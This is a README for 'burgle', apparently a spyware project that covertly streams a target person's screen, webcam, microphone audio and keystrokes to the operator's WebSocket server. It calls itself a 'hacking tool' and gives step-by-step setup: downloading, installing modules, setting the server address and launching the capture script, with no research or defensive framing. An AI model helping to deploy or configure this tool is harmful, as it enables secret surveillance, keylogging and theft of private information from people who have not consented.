# burgle

"Burgle" is a program that allows for monitoring of an individual. It is characterized by streaming the target computer's screen, webcam, the person's voice, and keylogs.

## Features

- 💻 Display Capture: Observe what the other person is doing on their computer.
- 📹 Webcam Stream: Observe what the other person is doing in front of their computer.
- 🎙️ Voice Stream: Observe what the other person is saying in front of their computer.
- 🔐 Key log: Observe what the other person is searching for on their computer.

## Installation
To install burgle, follow these simple steps:

1. ⬇️ Download: Start [download](/Quema100/burgle/archive/refs/heads/main.zip") .
2. 📁 Install Moudules: ``npm i`` with install python moudules ([Python Moudule List](./requirements.txt)).
3. ⚒️ Fix Server Address: [```socket = new WebSocket('ws://your-server-address:your-port');```](./server/public/js/), [```server = websockets.serve(module-name, "your-server-address", 8765)```](./hack/)
4. 🏃‍♀️ Start Burgle: 
    
    start hacking tool:
    
        ```py 
        python main.py
        ```
    start web server:

        ```ps 
        npm start
        ```